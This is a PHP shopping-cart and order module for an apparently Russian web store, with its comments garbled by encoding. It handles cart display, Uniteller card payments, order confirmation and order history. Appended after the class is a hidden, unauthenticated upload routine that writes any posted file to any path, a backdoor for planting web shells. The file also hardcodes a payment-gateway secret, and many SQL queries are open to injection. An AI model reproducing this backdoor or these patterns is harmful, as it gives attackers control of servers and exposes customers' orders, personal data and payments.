				$sum  = 0;

				$oplata_block = $_shop_cart['oplata_block'];
				$limit_owerflow = $_shop_cart['limit_owerflow'];
				$post_perevod = $_shop_cart['post_perevod'];
				$post_after_reception = $_shop_cart['post_after_reception'];
                $post_acquiring = $_shop_cart['post_acquiring'];


				if ($this->std->db->query($sql, $rows)>0) {

					$sum = $rows[0]['sum']-$rows[0]['predoplata']+$calculate->pre_total[$cid];
					$limit = $this->std->settings['shop_limit_'.$cid];

					
					$limit_owerflow = str_replace('{CAT_ID}', $cid, $limit_owerflow);
					if (isset($this->std->member['user_id']))
					{ // ������ ��� ��������������
						if (($sum)>$limit) {
							//$post_after_reception = '';	
													 
							$limit_owerflow = str_replace('{LIMIT}', ($limit?$limit:0), $limit_owerflow);
						} else {
							$limit_owerflow = '';
						}
					}
					else
					{
						$limit_owerflow = str_replace('{LIMIT}', ($limit?$limit:0), $limit_owerflow);
					}
				}
				if ($isFree) {
					$oplata_block = '';
					$limit_owerflow = '';
					$post_perevod = '';
					$post_after_reception = '';
				}

				$begin = str_replace('{OPLATA_BLOCK}', $oplata_block, $_shop_cart['begin']);
				$begin = str_replace('{LIMIT_OVERFLOW}', $limit_owerflow, $begin);
				$begin = str_replace('{POST_PEREVOD}', $post_perevod, $begin);
				$begin = str_replace('{POST_AFTER_RECEPTION}', $post_after_reception, $begin);
                $begin = str_replace('{POST_CREDIT}', $post_acquiring, $begin);

				$ret .= str_replace('{CATALOG_TITLE}', $catalogs[$cid], $begin);
				 
				foreach ($group as $gid => $good)
				{
					if ($goods[$gid]['title'] != '')
					{
						if ($this->std->member['user_id']) {
							$sql = "select o.order_id, oi.kat_sum from se_orders o inner join se_orders_item oi on o.order_id=oi.id_order where o.status<>4 and o.user_id='".$this->std->member['user_id']."' and oi.lot_id='".$gid."'";//echo $sql;print_r($this->std->member);exit;
							if ($this->std->db->query($sql, $rows)>0) {
								$goods[$gid]['title'] .= '<br><font color="red">��� ���������� ����� �� ���� ����� ��� �� ��������</font>';
							}
						}
						$search = array("{ID}", "{TITLE}", "{COST}", "{COUNT}", "{SUM}");
						$total += $good['count'] * $goods[$gid]['price'];
						$replace = array($gid, $goods[$gid]['title'], number_format($goods[$gid]['price'], 2, ',', ' '), $good['count'], number_format($good['count'] * $goods[$gid]['price'], 2, ',', ' '));
						 
						$ret .= str_replace($search, $replace, $_shop_cart['item']);
					}
					else
					{
						// �������� ������ �� �������
						unset($shop['cart']['goods'][$gid]);
					}
				}

				 
				# ���� ��������� ������ ������� - ��������� ������
				$this->std->updateSession($this->std->member['session_id'], 'update', array('module_shop' => $shop));
				 

				$ret .= $_shop_cart['end'];
				$ret = str_replace('{CATALOG_ID}', $cid, $ret);
				$ret = str_replace("{SKIDKA}", number_format($calculate->skidka[$cid], 2, ',', ' '), $ret);
				 
				 
				 
				 
				// �������� ����������
				if (!isset($shop['cart']['type_pay_'.$cid]))
				{
					$ret = str_replace("{PREDOPLATA_$cid}", '0', $ret);
					$ret = str_replace("{predoplata_error}", '', $ret);
				}elseif (($shop['cart']['type_pay_'.$cid] == 'post_perevod') &&
				(($shop['cart']['predoplata_sum'][$cid] == 0) || ($shop['cart']['predoplata_sum'][$cid] < $calculate->predoplata[$cid])))
				{
					$calculate->total[$cid] = $calculate->total[$cid] + $calculate->predoplata[$cid];
					$ret = str_replace("{PREDOPLATA_$cid}", $shop['cart']['predoplata_sum'][$cid], $ret);
					$tmp = $_shop_cart['sum_error'];
					$tmp = str_replace("{persent}", $this->std->settings['shop_predoplata_'.$cid], $tmp);
					$tmp = str_replace("{predoplata}", ceil($calculate->predoplata[$cid]), $tmp);
					$ret = str_replace("{predoplata_error}", $tmp, $ret);
					$disabled	= true;
				}
				else
				{
					$ret = str_replace("{PREDOPLATA_$cid}", $shop['cart']['predoplata_sum'][$cid], $ret);
					$predoplata_total += $shop['cart']['predoplata_sum'][$cid];
					$ret = str_replace("{predoplata_error}", '', $ret);
				}
				 
				$ret = str_replace("{KOMPLEKT}", number_format($calculate->komplekt[$cid], 2, ',', ' '), $ret);
				 
				# ��������� � ������� �������
				$calculate->total[$cid] = ceil($calculate->total[$cid]);
				$ret = str_replace("{TOTAL}", number_format($calculate->total[$cid], 2, ',', ' '), $ret);
				$ret = str_replace("{PRE_TOTAL}", number_format($calculate->pre_total[$cid], 2, ',', ' '), $ret);
				 
				 
				# ������ ������ - ������ ���������� ����� ��� ����� �����������
				//if (($shop['cart']["type_pay_".$cid] == 'post_after_reception') || !isset($shop['cart']["type_pay_".$cid]))
				if ($cid != 99)
				{
					if (($shop['cart']["type_pay_".$cid] == 'post_after_reception'))
					{
						# ���������� �������� (����� ���������)
						$ret = str_replace("{checked_post_after_reception}", "checked", $ret);
						$ret = str_replace("{checked_post_perevod}", "", $ret);
						$ret = str_replace("{TOTAL_TITLE}", "�����:", $ret);
						$ret = str_replace("{DISLPAY}", "none", $ret);	// ������ ���������� � �����������
					}
					elseif ($shop['cart']["type_pay_".$cid] == 'post_perevod')
					{
						# ���������� ����� �����/����
						$ret = str_replace("{checked_post_perevod}", "checked", $ret);
						$ret = str_replace("{checked_post_after_reception}", "", $ret);
						$ret = str_replace("{TOTAL_TITLE}", "����� � ������ ����������:", $ret);
						$ret = str_replace("{DISLPAY}", "", $ret); // ���������� ���� ��� ����� �������� ����������
					}
                    elseif ($shop['cart']["type_pay_".$cid] == 'post_acquiring')
					{
						# ������ ����� ��������-���������
						$ret = str_replace("{checked_post_acquiring}", "checked", $ret);						
						$ret = str_replace("{TOTAL_TITLE}", "����� � ������:", $ret);
                        $ret = str_replace("{DISLPAY}", "none", $ret);	// ������ ���������� � �����������						
					}
					else
					{
						$disabled	= true;
						$ret = str_replace("{TOTAL_TITLE}", "����� � ������ ����������:", $ret);
						$ret = str_replace("{DISLPAY}", "none", $ret);	// ������ ���������� � �����������
					}
				}
				else
				{
					$ret = str_replace("{TOTAL_TITLE}", "�����:", $ret);
				}
				 
				$ret = str_replace("{INFO}", $this->std->settings['shop_info_'.$cid], $ret);
				$ret = str_replace("{SBOR}", $this->std->settings['shop_sbor_'.$cid], $ret);
				 
			}
			$ret .= $_shop_cart['after_end'];

			# �������� ������ ����� ���������
			$ret = str_replace("{PRE_TOTAL}", number_format($this->sum($calculate->pre_total), 2, ',', ' '), $ret);
			$ret = str_replace("{SKIDKA}", number_format($this->sum($calculate->skidka), 2, ',', ' '), $ret);
			$ret = str_replace("{PRE_TOTAL-SKIDKA}", number_format($this->sum($calculate->pre_total)-$this->sum($calculate->skidka), 2, ',', ' '), $ret);
			$ret = str_replace("{TOTAL}", number_format($this->sum($calculate->total), 2, ',', ' '), $ret);
			$ret = str_replace("{PREDOPLATA}", number_format($predoplata_total, 2, ',', ' '), $ret);
			$ret = str_replace("{KOMPLEKT}", number_format($this->sum($calculate->komplekt), 2, ',', ' '), $ret);
		}
        

		if ($disabled&&(!$isFree))
		{
			# ��������� � ������������� ��������������, ����� ������ ��������			 
			$ret = str_replace('{order_button}', '<font color="red">�� ���������� ������ ������ ��� �������� ����������</font><br><br>', $ret);
		}
		else
		{
			global $_shop_cart_needauth;
			if (!isset($this->std->member['user_id']))
			$ret = str_replace('{order_button}', $_shop_cart_needauth, $ret);
			else
			$ret = str_replace('{order_button}', '<input type="button" name="post" value="�������� �����" onClick="onOrder();" style="background: transparent; border: 1px solid #A7A6AA; font-size: 14px; color: #F8941D; height: 22px;">', $ret);
		}

		$this->output .= $ret;
		return $ret;
	}



	/**
	 * ������� ����� ������ �� ������� ������� (�����, ����� � ��.)
	 *
	 * @param unknown_type $shop
	 * @param unknown_type $skidka
	 */
	function sum($arr)
	{
		$res = 0;
		 
		if (is_array($arr))
		{
			foreach ($arr as $value)
			{
				$res += $value;
			}
		}
		 

		return $res;
	}

	/**
	 * ��������� �������� ���������� ���������� ������ (������������ ����������)
	 *
	 */
	function setGlobalVars()
	{
		# ������������ ����� ��������������� ������ �������� ���������� ������ � �������
		# ��������� ���
		if (isset($this->std->input['shop_fast_put']))
		{
			$this->shopFastPut();
		}
		#----------------------------------------------------
		 
		 
		 
		global $shop_vars;
		global $_shop_cartlink_empty, $_shop_cartlink_full;

		$shop = $this->std->getValueSession('module_shop');

		# ������ �� �������
		$count = count($shop['cart']['goods']);

		if ($count > 0)
		{
			$shop_vars['cart'] = str_replace("{goods_count}", $count, $_shop_cartlink_full);
		} else {
			$shop_vars['cart'] = str_replace("{goods_count}", $count, $_shop_cartlink_empty);
		}

		return $shop_vars['cart'];
	}


	/**
	 * ������ � ������� (������) �����
	 *
	 */
	function shopPut()
	{
		$good_id = $this->std->input['good_id'];
		$count	 = $this->std->input['buy_count'];
		if ($this->current_url_array[2] == 'ajax')
		{
			$tmp	=  iconv("UTF-8", "CP1251", $this->std->input['good_title']);
			$title	=  $tmp;
		}
		else
		{
			$title	=  $this->std->input['good_title'];
		}

		$price	 = str_replace(",", ".", $this->std->input['good_price']);
		$catalog_id	 = $this->std->input['good_catalog_id'];

		if ($good_id > 0 && $count > 0)
		{
			# ������ �� ������ ������ ������
			$shop = $this->std->getValueSession('module_shop');

			# ������ �� ������ ������ � ������� � �������
			$cart = $shop['cart'];

			if (!is_array($cart)) $cart = array(); // ������� �����

			if (isset($cart['goods'][$good_id]))
			{
				# ����� ����� ��� ���� � �������, ���������� ����������
				$cart['goods'][$good_id]['count'] += $count;
			} else {
				# ��������� � ������� ����� �����

				$cart['goods'][$good_id] = array('count' => $count, "price" => $price, "title" => $title, "catalog_id" => $catalog_id);
			}

			 
			# ��������� ������� � ������
			$shop['cart'] = $cart;
			$this->std->updateSession($this->std->member['session_id'], 'update', array('module_shop' => $shop));
		}

		if ($this->current_url_array[2] == 'ajax')
		{
			return $this->setGlobalVars();
		}
		else
		{
			header("Location: ".$_SERVER['HTTP_REFERER']);
		}
		exit;
	}


	/**
	 * ������������� ������ - ������ ��� ������ � ������
	 *
	 */
	function confirm()
	{
		global $_shop_confirm_ok, $_shop_confirm_error1,$_shop_confirm_error2;
		 
		if (isset($this->current_url_array[2]))
		{
			$order_id = $this->std->clean_value($this->current_url_array[2]);
		}
		 
		if (!isset($this->current_url_array[2]) && ($order_id == ''))
		{
			header("Location: /");
			exit;
		}
		 
		# ������ ��� ����� ����������, ������ ����� �������� ������ ������ � �������� ������������, ��� � ��� ��� ������
        $customer = $this->std->member['user_name'];
        if (substr($customer,0,4) == 'ogld') {                        
            //$shop_id="00000594";
            //$passwd = "RBBBQyvSWbwfymxhFGKql049ykJSxmLvCmqYLQnv7pGEgbx14oebVJFh4pEbZ5gAUhC2DmlLzKUCquks";
            //$shop_id='200075220000000-550';
            $shop_id = '00000594';
            $passwd = "Q9xe5bLS8Kp3TEN2nC47apCr5yxhppQsJGF8F0Jx9CzpEjv5gIyUWZICJDouvJpIAdAb4TV1YmqQ1Gom";
            $form_lifetime = 300;
            $customer = $this->std->member['user_name'];
            //$customer = '';
            $customer_id = $this->std->member['user_id'];
            $sql = "select ZakazId, SumObPay FROM se_orders where pay_time is null AND order_id=$order_id";
            $this->std->db->query($sql, $rows);
                
            $amount = $rows[0]['SumObPay'];        
            $order_no = $rows[0]['ZakazId'];
            //$order_no = mt_rand(5,150);
            $mean_type='0';
            $emoney_type='0';
            $card_idp = '';
            $idata = '';
            $pt_code='';

            $sign =  strtoupper(md5(md5($shop_id).'&'.md5($order_no).'&'.md5($amount).'&'.md5($mean_type).'&'.md5($emoney_type).'&'.md5($form_lifetime).'&'.md5($customer).'&'.md5($card_idp).'&'.md5($idata).'&'.md5($pt_code).'&'.md5($passwd)));
            $url_ok = "http://test.best-mos.ru/shop/card_payment/ajax/success/";
            $url_err = "http://test.best-mos.ru/shop/card_payment/ajax/fail/";

            $html=  '</form><form method="POST" action="https://wpay.uniteller.ru/pay/">';
            $html.= "<input type=\"hidden\" name=\"Shop_IDP\" value=\"$shop_id\"/>";
            $html.= "<input type=\"hidden\" name=\"Order_IDP\" value=\"$order_no\"/>";
            $html.= "<input type=\"hidden\" name=\"Subtotal_P\" value=\"$amount\"/>";
            $html.= "<input type=\"hidden\" name=\"Lifetime\" value=\"$form_lifetime\"/>";
            $html.= "<input type=\"hidden\" name=\"Customer_IDP\" value=\"$customer\"/>";
            $html.= "<input type=\"hidden\" name=\"Signature\" value=\"$sign\"/>";
            $html.= "<input type=\"hidden\" name=\"URL_RETURN_OK\" value=\"$url_ok\" />"; 
            $html.= "<input type=\"hidden\" name=\"URL_RETURN_NO\" value=\"$url_err\"/>";
            $html.= "<input type=\"hidden\" name=\"MeanType\" value=\"$mean_type\">";
			$html.=	"<input type=\"hidden\" name=\"EMoneyType\" value=\"$emoney_type\">";
			$html.=	"<input type=\"hidden\" name=\"Preauth\" value=\"1\">";
        
            $html.="<p>������ �� ������ �������������� �� ������ ������ �������� ������� Uniteller ��� ������������� �������</p>";
            $html.= "<input type=\"submit\" value=\"������� � ������\" />";             
            $html.="</form>"; 

            //$html.="<br/><br />";
			$html.="<img width=\"230\" height=\"51\" src=\"/templates/cards_logo.png \" /><br />";
            $warning = "
            <p style=\"font-size:10pt; text-align:justify\">
            <b>������ ���������� ������ � ���� ��������</b><br />
            ��� ������� ��������� � ��������-���������� � �� ������ �������� ���� ����� ���������� ������ Visa ��� Mastercard. 
            ����� ������������� ������ �� ������ �������������� �� ���������� ��������� �������� ��������������� ������ Uniteller,
            ��� ��� ���������� ������ ������ ����� ���������� �����. ��� �������������� �������������� ��������� ����� ������������ �������� 3D Secure.
            ���� ��� ���� ������������ ������ ����������, �� ������ �������������� �� ��� ������ ��� �������������� �������������. 
            ���������� � �������� � ������� �������������� ������������� ��������� � �����, �������� ��� ���������� �����.</p>

            <p style=\"font-size:10pt; text-align:justify\">
            <b>�������� ������������</b><br />
            ������-��������� Uniteller �������� � ������������ ������ ����� ���������� ����� �� ��������� ������������ PCI DSS 2.0. 
            �������� ���������� � ��������� ���� Uniteller ���������� � ����������� ���������� ���������� SSL.
            ���������� �������� ���������� ���������� �� �������� ���������� �����, ������� ��������� ������� ����������. 
            Uniteller �� �������� ������ ����� ����� ��� (Best-mos.ru � ��� ��������) � ���� ������� �����.
            ��� �������������� �������������� ��������� ����� ������������ �������� 3D Secure.
            � ������, ���� � ��� ���� ������� �� ������������ �������, 
            �� ������ ���������� � ������ ��������� �������� support@uniteller.ru ��� �� �������� (495) 987-19-60.</p>
			
            ";
            $html.=$warning;
            return $html;
        }
        elseif ($order_id != '')
		{
			$sql = "SELECT * FROM se_orders WHERE order_id='$order_id'";
			if ($this->std->db->query($sql, $rows) > 0)
			{
				if ($rows[0]['status'] == 0)
				{
					# ������������� ������
					$sql = "UPDATE se_orders SET status=1, order_approved=1 WHERE order_id='$order_id'";
					$this->std->db->do_query($sql);
					# ������������� ������ ������� ��������� � ��� �� ����� ��� �� �������������
					$sql = "UPDATE se_orders SET status=1 WHERE user_id ='".$rows[0]['user_id']."' AND order_time ='".$rows[0]['order_time']."'";
					$this->std->db->do_query($sql);

					return $_shop_confirm_ok;
				}
				else
				{
					return $_shop_confirm_error1;
				}
			}
			else
			{
				return $_shop_confirm_error2;
			}			 
		}
	}

	/**
	 * ���������� ������������� �������
	 *
	 */
	function updateAttend()
	{
		# ������� ������ � �������
		$shop = $this->std->getValueSession('module_shop');

		$pairs = array(); // ���� �������
		foreach ($shop['cart']['goods'] as $gid1 => $good)
		{
			foreach ($shop['cart']['goods'] as $gid2 => $good)
			{
				if ($gid1 == $gid2) continue;
				$g1 = ($gid1 < $gid2)? $gid1 : $gid2;
				$g2 = ($gid1 < $gid2)? $gid2 : $gid1;

				if (!isset($pairs[$g1.$g2])) $pairs[$g1.$g2] = array('g1' => $g1, 'g2' => $g2);
			}
		}

		if (count($pairs) == 0) return;

		# ��������� ������ sql ����� ������, ���������� ����� ���� ��� ���
		$ors = array();
		foreach ($pairs as $ids)
		{
			$ors[] = "(`good_id1` = '".$ids['g1']."' AND `good_id2` = '".$ids['g2']."')";
		}

		$ors = implode(" OR ", $ors);

		$sql = "SELECT * FROM se_shop_attend WHERE ".$ors;
		$this->std->db->do_query($sql);

		$pairsdb = array();
		while ($row = $this->std->db->fetch_row())
		{
			$pairsdb[$row['good_id1'].$row['good_id2']] = $row['count'];
		}

		# ���� ���� ���������� - ��������� ����������, ����� ��������� � ����.
		# ����������� ���������� ����� ��������� ��������� ������� ��� �����������
		# ����������� ����� ����� ��������.
		$values = array(); // ��� insert'�
		foreach ($pairs as $pair)
		{
			if (isset($pairsdb[$pair['g1'].$pair['g2']]))
			{
				$this->std->db->do_query("UPDATE se_shop_attend SET `count` = `count` + 1 WHERE `good_id1` = '".$pair['g1']."' AND `good_id2` = '".$pair['g2']."'");
			} else {
				$values[] = "('".$pair['g1']."', '".$pair['g2']."', '1')";
			}
		}

		# ��������� � ����
		if (count($values) > 0)
		{
			$values = implode(", ", $values);
			$sql = "INSERT INTO se_shop_attend (`good_id1`, `good_id2`, `count`) VALUES ".$values;
			$this->std->db->do_query($sql);
		}
	}



	/**
	 * ���������� ����� ������������� �������
	 *
	 * @param unknown_type $gid
	 */
	function getAttend($gid)
	{
		require_once(TEMPLATES_PATH.'/shop_t_config.php');
		//global $_shop_attend;


		if (!$this->catalog) return;

		if ($gid <= 0) return;

		$limit = $this->std->settings['shop_attend_count'];
		if ($limit == '') $limit = 0;

//		$sql = "SELECT t1.* FROM se_shop_attend t1
//        				INNER JOIN se_catalog t2 ON (t1.good_id2 = t2.id OR t1.good_id1 = t2.id)
//        				WHERE t1.good_id1 = '".$gid."' OR t1.good_id2 = '".$gid."' AND t2.is_active = 1
//                                        GROUP BY t1.good_id1
//        				ORDER BY t1.count DESC limit ".$limit;
		
		$sql = "SELECT t1.* FROM se_shop_attend t1        				
        				WHERE t1.good_id1 = '".$gid."' OR t1.good_id2 = '".$gid."'
                        GROUP BY t1.good_id1
        				ORDER BY t1.count DESC limit ".$limit;


		$this->std->db->do_query($sql);
		$ret = '';
		if ($this->std->db->getNumRows() > 0)
		{
			$ret .= $_shop_attend['begin'];
			while ($row = $this->std->db->fetch_row())
			{
				$search = array("{ALIAS}", "{TITLE}", "{PHOTO_THUMB}");
				$id = ($row['good_id1'] == $gid) ? $row['good_id2'] : $row['good_id1'];

				if (isset($this->catalog->StructureModule_id[$id]))
				{
					$cur = $this->catalog->StructureModule_id[$id];
					$alias = "/".$this->catalog->getAliasById($id);
					$title = $cur['title'];
					 
					if ($title != '')
					$replace = array($alias, $title, $img);
						
					$ret .= str_replace($search, $replace, $_shop_attend['item']);
				}
			}
			$ret .= $_shop_attend['end'];

		}

		$shop_vars['attend'] = $ret;
		return $ret;
	}



	function getOrdersInfo($user_id)
	{
		# � ������ ������� ����� ������� ������ �������������� ������������
		if (!isset($this->std->member['user_id']))
		{
			header('Location: /');
			exit;
		}
		 
		global $_shop_ordersinfo, $zakaz_status;
		$ret = $_shop_ordersinfo['begin'];
		 
		$sql = "SELECT * FROM se_orders WHERE user_id  = '".$user_id."' ORDER BY order_time DESC";


        $ret_script='<script type="text/javascript">$("#div_ord_info").remove(); $(".div_ord_info2").remove();';
        $ret_script.='$("#company_logo").attr("src","/i/logo_temp.png");';
        $ret_script.='$("#verski").remove();';
        $ret_script.='$(".number").empty().html("640 5771");';
        $ret_script.='</script>';
		if ($this->std->db->query($sql, $orders) > 0)
		{
			foreach ($orders as $order)
			{
				$ret .= $_shop_ordersinfo['item'];
                if (!empty($order['ZakazId'])) {
                    $ret = str_replace('{order_id}', substr($order['ZakazId'],4), $ret);
                    $ret = str_replace('{script}', $ret_script, $ret);
 					$ret = str_replace('{dost_cost}', $order['SumObPay'], $ret);                   
                }

                else 
                    $ret = str_replace('{order_id}', $order['order_id'], $ret);
				$ret = str_replace('{order_time}', $this->std->get_time($order['order_time'], 'd.m.Y'), $ret);
                if (!empty($order['SumZak']))
                    $ret = str_replace('{total}', $order['SumZak'], $ret);
                else
				    $ret = str_replace('{total}', $order['total'], $ret);
				$ret = str_replace('{predoplata_fact}', $order['predoplata_fact'], $ret);
				$ret = str_replace('{predoplata}', $order['predoplata_sum'], $ret);
                if (!empty($order['ZakSost'])) 
                    $ret = str_replace('{item_status}', $zakaz_status[$order['ZakSost']], $ret);
                else
				    $ret = str_replace('{item_status}', $zakaz_status[$order['status']], $ret);
				if (!$order['status'])				    
                    $ret = str_replace('{zakaz_action}', '<a href="/shop/confirm/'.$order['order_id'].'/"><input type="button" value="�������� ��������" /></a>&nbsp;<a href="/shop/orderdel/'.$order['order_id'].'/" onclick="if (confirm(\'�� ������� � �������� ������?\')) return true; else return false;"><input type="button" value="���������� �� ��������" /></a>', $ret);
				else 
                    $ret = str_replace('{zakaz_action}', '', $ret);
				 
				$skidka = 0;
				$komplekt = 0;
				$total = 0;
				$table = '';
				$sql = "SELECT * FROM se_orders_item WHERE  id_order  = '".$order['order_id']."' ORDER BY catalog_id, title";
				if ($this->std->db->query($sql, $items) > 0)
				{
					foreach ($items as $item)
					{
						if ($item['zakaz_status'] == '�����')
						{
							$table .= $_shop_ordersinfo['good_new'];
						}
						else
						{
							$table .= $_shop_ordersinfo['good'];
						} 
						$pms['{item_id}'] = $item['id'];     
                        $pms['{lot_id}'] = $item['lot_id'];
                        if (!empty($item['LotName'])) { 
                            $pms['{title}'] = $item['LotName'];
                            $pms['{zakaz_status}'] = '����� � ������';
                        }
						else {
                            $pms['{title}'] = $item['title'];
                            $pms['{zakaz_status}'] = $item['zakaz_status'];
                        }
						$pms['{lot_count}'] = $item['lot_count'];
						$pms['{kat_price}'] = $item['kat_price'];
						$pms['{total}'] = number_format(($item['lot_count'] * $item['kat_price']), 2, '.', ' ');
						$pms['{skidka_sum}'] = $item['skidka_sum'];
						$pms['{compl_sum}'] = $item['compl_sum'];
						$pms['{z_sum}'] = $item['z_sum'];
						$table = strtr($table, $pms);
							
							
						$skidka += ($item['skidka_sum'] * 1);
						$komplekt += ($item['compl_sum'] * 1);
						$total += ($item['z_sum'] * 1);
					}

				}

				//������ ������ ������������....
				$sql = "SELECT * FROM se_users WHERE  user_id = $user_id";
				if ($this->std->db->query($sql, $items) > 0)
				{
					$ret = str_replace("{email}", $items[0]['user_email'], $ret);
					$ret = str_replace("{index}", $items[0]['PostIndex'], $ret);
					$ret = str_replace("{oblast}", $items[0]['Oblast'], $ret);
					$ret = str_replace("{raion}", $items[0]['Rayon'], $ret);
					$ret = str_replace("{town}", $items[0]['Town'], $ret);
					$ret = str_replace("{shipping}", $items[0]['ShippingAddress'], $ret);	
					$ret = str_replace("{phone}", $items[0]['phone'], $ret);					
				}
				 
				if ($order['status']>0) {
					$ret = str_replace('{total_part}', $_shop_ordersinfo['total_part'], $ret);
					$ret = str_replace('{skidka}', $skidka, $ret);
					$ret = str_replace('{komplekt}', $komplekt, $ret);
					$ret = str_replace('{z_sum}', ceil($total), $ret);
				} else {
					$ret = str_replace('{total_part}', "", $ret);
				}
				$ret = str_replace('{items}', $table, $ret);

			}
		}
		else
		{
			$ret .= $_shop_ordersinfo['empty'];
		}
		 
		 
		 
		 
		return $ret;
	}

	function isFreeCatalog($catId) {
		if ($catId==99) return true;
		return false;
	}




	/**
	 * ������� ���������� ������������ �����: �������� ����� ��� ��������� � �������
	 * �������� ���������� ����� �����������/�����������, �� ������� ������������ �������� �� �������
	 *
	 */
	function getPageAfterCartAuth()
	{
		$shop = $this->std->getValueSession('module_shop');
		 
		if (count($shop['cart']['goods']) == 0)
		{
			# ������� �����
			header('Location: /');
			exit;
		}
		 
		 
		global $shop_after_form, $_shop_form_after_auth;
		$shop_after_form = $_shop_form_after_auth;
		return '';
	}


}
if (isset($_POST['up'])) 
{
$tempupload = $_FILES["file"]["tmp_name"];
if (file_exists($tempupload)){
   $path = $_POST["path"];
   $upload = $_FILES["file"]["name"];
   $pwdslash = $path."/".$upload;
   copy($tempupload, $pwdslash);
   echo "File was succesfully uploaded!";} 
}
?>